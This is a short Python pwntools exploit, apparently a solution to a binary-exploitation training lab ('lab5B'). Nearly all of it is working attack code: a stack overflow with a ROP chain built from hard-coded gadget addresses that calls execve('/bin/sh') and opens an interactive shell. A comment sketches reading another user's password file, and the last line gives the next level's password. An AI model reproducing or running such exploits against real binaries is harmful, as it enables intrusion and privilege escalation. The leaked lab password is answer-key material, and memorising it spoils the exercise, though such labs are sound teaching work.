from pwn import *

p = process('./lab5B')

def exploit():
    # binary is statically linked. no ASLR.
    buf_addr = 0xffffcd70+96 # address differs when using GDB
    INT_80 = 0x08049401 # invoke syscall
    POP_EAX_RET = 0x080bbf26
    POP_EBX_RET = 0x080481c9
    POP_ECX_RET = 0x080e55ad
    POP_EDX_RET =  0x0806ec5a
    """
    we need a rop chain to do:

    int fd = open("/home/lab5A/.pass", O_RDONLY);
    read(fd, buf, 127);
    write(0, buf, 127);
    """

    bin_sh = b"/bin/sh\x00"

    # input is being read by fgets(), which means it will keep reading until \n.
    # Therefore, we can put null terminator in our input.
    payload =  bin_sh + b"A" * (136 - len(bin_sh))
    payload += b"BBBB" # saved EBP
    payload += p32(POP_EAX_RET)
    payload += p32(0x0b) # eax = 0x0b (sys_execve)
    payload += p32(POP_EBX_RET)
    payload += p32(buf_addr) # ebx = pointer to /bin/sh
    payload += p32(POP_ECX_RET)
    payload += p32(0) # argv = NULL
    payload += p32(POP_EDX_RET)
    payload += p32(0) # envp = NULL
    payload += p32(INT_80)

    p.clean()
    #gdb.attach(p, 'b *0x08048e79')
    p.sendline(payload)
    p.interactive()

exploit()
# next password: th4ts_th3_r0p_i_lik3_2_s33